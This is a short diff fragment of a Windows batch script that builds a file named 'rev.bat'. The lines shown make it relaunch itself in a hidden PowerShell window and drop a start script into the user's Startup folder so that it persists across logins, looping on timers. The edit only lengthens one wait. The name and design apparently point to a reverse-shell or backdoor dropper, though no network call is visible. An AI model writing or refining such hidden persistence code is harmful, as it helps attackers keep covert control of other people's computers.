@@ -15,7 +15,7 @@ cd %temp%
     echo           echo powershell -c "Start-Process -FilePath "%temp%\rev.bat" -WindowStyle Hidden" ^>^> "%temp%\start.bat" >> rev.bat
     echo           move "%temp%\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" >> rev.bat      
     echo     ^) >> rev.bat
-    echo     timeout /t 7 /nobreak ^>nul >> rev.bat
+    echo     timeout /t 15 /nobreak ^>nul >> rev.bat
     echo     goto check_start_bat >> rev.bat
     echo timeout /t 300 /nobreak ^>nul >> rev.bat
     echo goto loop >> rev.bat
